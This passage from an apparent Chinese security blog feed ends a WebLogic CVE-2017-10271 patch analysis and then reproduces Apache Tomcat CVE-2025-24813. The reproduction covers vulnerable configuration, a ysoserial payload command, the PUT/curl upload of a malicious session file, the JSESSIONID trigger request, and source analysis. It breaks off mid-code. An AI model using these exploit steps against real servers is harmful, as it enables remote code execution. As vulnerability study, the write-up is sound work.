<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line"><span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">    parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid context type: object&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var5);</span><br><span class="line">&#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var6);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var7);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="VUOdj">CVE-2017-10271 补丁分析</h4>

<p>这里依然是进行黑名单判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">   <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="type">int</span> <span class="variable">overallarraylength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:object&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;new&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:new&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;method&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:method&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;void&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">attClass</span> <span class="operator">=</span> <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     <span class="keyword">if</span>(!<span class="string">&quot;index&quot;</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid attribute for element void:&quot;</span> + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;array&quot;</span>)) &#123;</span><br><span class="line">                  <span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">                  <span class="keyword">if</span>(var9 != <span class="literal">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">&quot;byte&quot;</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;The value of class attribute is not valid for array element.&quot;</span>);</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2025-24813</title>
    <url>/2025/05/15/CVE-2025-24813RCE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="McG6a">CVE-2025-24813 RCE复现</h1>

<p><strong>免责声明：本文只用作技术分析和学习，任何利用本文内容进行非法攻击的行为均与作者无关！！！</strong></p>
<p><strong>（也是写上免责声明了哈哈哈）</strong></p>
<p><strong>文章首发于</strong><a href="https://www.freebuf.com/vuls/425025.html"><strong>https://www.freebuf.com/vuls/425025.html</strong></a></p>
<h2 id="i9mjq">漏洞简介</h2>
<h3 id="iZQAX">漏洞描述</h3>
Apache Tomcat在特定配置下，存在反序列化漏洞。

<p>攻击者通过构造恶意的请求，利用特定配置 **文件会话持久机制 **将恶意序列化数据写入服务器中，并在后续请求中触发反序列化操作，从而导致远程代码的执行</p>
<p><strong>漏洞通报细节如下</strong></p>
<p><a href="https://blog.nsfocus.net/cve-2025-24813/">https://blog.nsfocus.net/cve-2025-24813/</a></p>
<h3 id="Pyd7c">影响范围</h3>
该漏洞影响范围如下

<ul>
<li>9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 9.0.98</li>
<li>10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 10.1.34</li>
<li>11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 11.0.2</li>
</ul>
<h3 id="CCFuK">漏洞利用条件</h3>

<ol>
<li>DefaultServlet 写入功能启用：需要在<code>web.xml</code>中配置<code>readonly=false</code></li>
<li>PartialPUT请求支持：tomcat中默认支持分块上传</li>
<li>文件会话持久化启用：在 context.xml 中配置 PersistentManager 和 FileStore</li>
<li>存在反序列化的利用链：需要包含漏洞的库（这里使用commons-collections-3.2.1.jar）</li>
</ol>
<h3 id="nq3lC">漏洞原理</h3>

<ol>
<li>Tomcat中文件会话持久化技术，<code>Content-Range</code>在Tomcat的HTTP PUT请求中主要实现用于大文件的分块传输，在文件上传未完成的情况下，会被临时储存在Tomcat的工作目录下<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>中</li>
<li>漏洞核心在于：对不完整的PUT请求上传的文件名处理机制：文件路径中的分隔符<code>/</code>会被转化为<code>.</code>。例如：对于PUT请求的路径<code>/evil/session</code>会被解析为<code>.evil.session</code>中</li>
<li>Tomcat的File会话存储默认路径同样位于：<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>，在Cookie中带有<code>JSESSIONID</code>字段时，Tomcat会将该字段中的<code>.id</code>与<code>.session</code>拼接，并从会话存储路径中寻找文件名为<code>.id.session</code>的文件，对该文件的内容进行反序列化操作，从而触发攻击链</li>
</ol>
<h3 id="ZpiSu">漏洞利用过程</h3>

<ol>
<li>当存在反序列化利用链时，上传包含恶意的序列化数据文件（临时存储在<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>）</li>
<li>通过设置<code>JSESSIONID=.xxxx</code>来触发漏洞（位置也在<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>）</li>
</ol>
<h2 id="AbOEq">漏洞复现</h2>
<h3 id="ebijR">环境搭建</h3>

<ul>
<li>Tomcat-9.0.98</li>
<li>JDK8u65</li>
</ul>
<p>Tomcat环境参考P神知识星球<code>《用Intellij Idea调试Tomcat.pdf》</code></p>
<p><strong>若师傅们可以自行搭建环境，可以跳过该部分QAQ</strong></p>
<h4 id="ZP0Xl">Maven</h4>


<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742301240907-fc1f1069-155b-4002-b4e0-bc83e23f8d01.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742301240907-fc1f1069-155b-4002-b4e0-bc83e23f8d01.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>创建好的目录大概如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742301433030-343de337-b090-4b15-92e4-7fdfad1b03fb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742301433030-343de337-b090-4b15-92e4-7fdfad1b03fb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="NuYGe">Tomcat</h4>

<p>TomCat下载：<a href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/</a></p>
<p>我们需要下载以下这两个安装包（后续都会有用的）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742301625200-33069853-775c-48be-9468-9f28f1e792d8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742301625200-33069853-775c-48be-9468-9f28f1e792d8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接下来我们需要导入依赖，这里将我们前面下载的Tomcat里所有的依赖直接添加到我们项目中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302059754-fbffd2c2-5352-4bd2-9e64-3cf2a1ae3827.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302059754-fbffd2c2-5352-4bd2-9e64-3cf2a1ae3827.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>找到下载的Tomcat下的lib包，将所有jar文件导入点击确定</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302137090-5c3608ff-4bb4-4f8b-a456-8ab004e69fc9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302137090-5c3608ff-4bb4-4f8b-a456-8ab004e69fc9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>为了后面的源码调试和防止源码调试过程中的反编译字节码与源码对于不上，我们还需要做两个操作</p>
<ol>
<li>将src源码下的java文件夹导入</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302311076-90dbdda7-b124-4b1a-8ff0-18a8b7fa59c2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302311076-90dbdda7-b124-4b1a-8ff0-18a8b7fa59c2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<ol start="2">
<li>将deployer下lib文件夹中的<code>tomcat-juli.jar</code>导入，并点击确定，这步我们就完成了</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302367801-50a13ac9-54f2-407d-a503-3cf8fed202ef.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302367801-50a13ac9-54f2-407d-a503-3cf8fed202ef.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在我们刚刚创建好的项目处，配置我们的Tomcat环境</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742301758347-2559bb93-19a1-4f47-974f-07f1668421a9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742301758347-2559bb93-19a1-4f47-974f-07f1668421a9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接下来我们创建Tomcat启动程序</p>
<p>并且创建好Tomcat启动程序后，我们要进行配置</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742301916594-cf99c0e7-beae-43d2-87f6-3f148d5c68f3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742301916594-cf99c0e7-beae-43d2-87f6-3f148d5c68f3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们可以看到，在部署下是没有任何东西的，我们需要点击修复(fix)，选择exploded</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302574691-e171407d-6d01-4d1f-99ee-9f04a879f536.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302574691-e171407d-6d01-4d1f-99ee-9f04a879f536.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>其中这里的目录可以随意</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302624934-835a99aa-b423-4cc3-aa31-7b10914ae84b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302624934-835a99aa-b423-4cc3-aa31-7b10914ae84b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>后续还有一个步骤才算完成，我们去Tomcat的bin目录下的<code>catalina.bat</code>文件中添加这么一段话（IDEA配置Tomcat工作目录好像是在C盘下IDEA中的一个地方，而我们需要设置<code>CATALINA_BASE</code>在Tomcat下）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">set <span class="string">&quot;CATALINA_BASE=F:\java\apache-tomcat-9.0.98&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302729674-37efd978-2d26-4b52-84c4-6a30b47c03a2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302729674-37efd978-2d26-4b52-84c4-6a30b47c03a2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>点击运行后，我们可以看到我们的Tomcat就配置好了，且<code>CATALINA_BASE</code>也正常</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302926107-45d14d66-4be3-4707-b6bf-0444f35c7df8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742302926107-45d14d66-4be3-4707-b6bf-0444f35c7df8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>为了满足漏洞环境，我们还需要去Tomcat中去修改一些配置</p>
<p>在Tomcat下conf目录中的<code>context.xml</code>中，加入以下配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;Manager className=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span><br><span class="line">        &lt;Store className=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span><br><span class="line">&lt;/Manager&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742303158600-9ba850b1-06ea-47df-b472-58a556296d3d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742303158600-9ba850b1-06ea-47df-b472-58a556296d3d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在同文件夹下的<code>web.xml</code>中，设置readonly为false（若配置文件中没有则自己添加）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;<span class="keyword">default</span>&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;<span class="literal">false</span>&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742303186630-bd1df2fe-fa21-409d-ae01-55028dde27b5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742303186630-bd1df2fe-fa21-409d-ae01-55028dde27b5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这样我们的漏洞环境就配置好了</p>
<h3 id="hrJwe">漏洞实现</h3>
现在我们来用已有的POC，简单复现一下这个漏洞

<p>我们用<code>ysoserial</code>去生成一个CC6的恶意序列化数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;Calc&quot;</span> &gt; payload.ser</span><br></pre></td></tr></table></figure>

<p>用PUT请求去上传，数据包如下</p>
<p>我们需要注意的是Range的分块值需要与Length保持一致，且大于当前文件的长度。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PUT /evil/session HTTP/<span class="number">1.1</span>  </span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.131</span><span class="number">.32</span>:<span class="number">8080</span>  </span><br><span class="line">Content-Length: <span class="number">1000</span>  </span><br><span class="line">Content-Range: bytes <span class="number">0</span>-<span class="number">1000</span>/<span class="number">1200</span>  </span><br><span class="line"></span><br><span class="line">&#123;&#123;反序列化文件内容)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以使用curl命令，效果也是一样的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X PUT -H <span class="string">&quot;Content-Range: bytes 0-999/1200&quot;</span> --data-binary <span class="meta">@payload</span>.ser http:<span class="comment">//target:8080/evil/session</span></span><br></pre></td></tr></table></figure>

<p>然后我们就可以看到，在ROOT目录下，存在了一个<code>.evil.session</code>文件，里面存放着我们的恶意序列化数据</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742303528012-9ddb349b-7347-40b3-aa40-c3b86fdae394.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742303528012-9ddb349b-7347-40b3-aa40-c3b86fdae394.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后我们需要用以下数据包，去触发我们恶意序列化数据的反序列化操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span>  </span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.131</span><span class="number">.32</span>:<span class="number">8080</span>  </span><br><span class="line">Cookie: JSESSIONID=.evil</span><br></pre></td></tr></table></figure>

<p>发送数据包后即可弹出计算器（另一个发现是，在一段时间后，他会自动去触发该payload，并且清空我们所上传的<code>.evil.session</code>文件）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742303804373-6b9fc684-c4c1-4819-ae6e-9e81e3c9cda1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742303804373-6b9fc684-c4c1-4819-ae6e-9e81e3c9cda1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="NVDlb">源码分析</h2>
该漏洞实现存在两个点

<ol>
<li>能够上传<strong>包含有恶意内容</strong>且构造<strong>混淆文件名</strong>的恶意文件</li>
<li>session文件的默认存储点正好位于当前Context的临时文件夹下，在处理cookie时中<code>JSESSIONID</code>时会对ROOT目录下<code>id.session</code>的文件进行反序列化操作</li>
</ol>
<p>两者本身根据都没有很大问题，但是合在一起就构成了RCE漏洞（很有魅力了网安）</p>
<h3 id="xJV3F">临时文件创建源码分析</h3>
漏洞存在在`DefaultServlet`中`doPut`方法，里面存在一个`executePartialPut`方法，是些临时文件的函数

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPut</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="comment">//判断readOnly配置，只有其设为false是，我们才能走到this.executePartialPut中    </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readOnly) &#123;</span><br><span class="line">            <span class="built_in">this</span>.sendNotAllowed(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="built_in">this</span>.getRelativePath(req);</span><br><span class="line">            <span class="type">WebResource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="built_in">this</span>.resources.getResource(path);</span><br><span class="line">            <span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> <span class="built_in">this</span>.parseContentRange(req, resp);</span><br><span class="line">            <span class="keyword">if</span> (range != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">resourceInputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (range == IGNORE) &#123;</span><br><span class="line">                        resourceInputStream = req.getInputStream();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="built_in">this</span>.executePartialPut(req, range, path);</span><br><span class="line">                        resourceInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(contentFile);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.resources.write(path, (InputStream)resourceInputStream, <span class="literal">true</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (resource.exists()) &#123;</span><br><span class="line">                            resp.setStatus(<span class="number">204</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            resp.setStatus(<span class="number">201</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            resp.sendError(<span class="number">409</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IllegalStateException var15) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;......</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过调试，想要走入我们的<code>executePartialPut</code>方法，就要设置一个合法的<code>Content-Range</code>，若不设置，就会走入if判断中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742305157873-c5073d8d-6e15-4e3c-a946-2b7e3b2de9fb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742305157873-c5073d8d-6e15-4e3c-a946-2b7e3b2de9fb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们继续走进<code>executePartialPut</code>方法中，我在代码中写入了一些注释分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> File <span class="title function_">executePartialPut</span><span class="params">(HttpServletRequest req, Range range, String path)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//tempDir默认值为CATALINA_BASE\work\Catalina\localhost\ROOT</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">tempDir</span> <span class="operator">=</span> (File)<span class="built_in">this</span>.getServletContext().getAttribute(<span class="string">&quot;javax.servlet.context.tempdir&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将文件path中的/转换为.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">convertedResourcePath</span> <span class="operator">=</span> path.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(tempDir, convertedResourcePath);</span><br><span class="line">        <span class="keyword">if</span> (contentFile.createNewFile()) &#123;</span><br><span class="line">            <span class="comment">//在 Tomcat 终止时清理 contentFile</span></span><br><span class="line">            contentFile.deleteOnExit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">randAccessContentFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(contentFile, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebResource</span> <span class="variable">oldResource</span> <span class="operator">=</span> <span class="built_in">this</span>.resources.getResource(path);</span><br><span class="line">            <span class="comment">//判断是否为文件</span></span><br><span class="line">            <span class="keyword">if</span> (oldResource.isFile()) &#123;</span><br><span class="line">                <span class="type">BufferedInputStream</span> <span class="variable">bufOldRevStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(oldResource.getInputStream(), <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">byte</span>[] copyBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> numBytesRead;</span><br><span class="line">                    <span class="keyword">while</span>((numBytesRead = bufOldRevStream.read(copyBuffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                        randAccessContentFile.write(copyBuffer, <span class="number">0</span>, numBytesRead);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var17) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        bufOldRevStream.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var16) &#123;</span><br><span class="line">                        var17.addSuppressed(var16);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> var17;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                bufOldRevStream.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            randAccessContentFile.setLength(range.length);</span><br><span class="line">            randAccessContentFile.seek(range.start);</span><br><span class="line">            <span class="type">byte</span>[] transferBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">requestBufInStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(req.getInputStream(), <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> numBytesRead;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span>((numBytesRead = requestBufInStream.read(transferBuffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="comment">//向文件中写入内容</span></span><br><span class="line">                    randAccessContentFile.write(transferBuffer, <span class="number">0</span>, numBytesRead);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var18) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    requestBufInStream.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var15) &#123;</span><br><span class="line">                    var18.addSuppressed(var15);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> var18;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            requestBufInStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var19) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                randAccessContentFile.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var14) &#123;</span><br><span class="line">                var19.addSuppressed(var14);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span 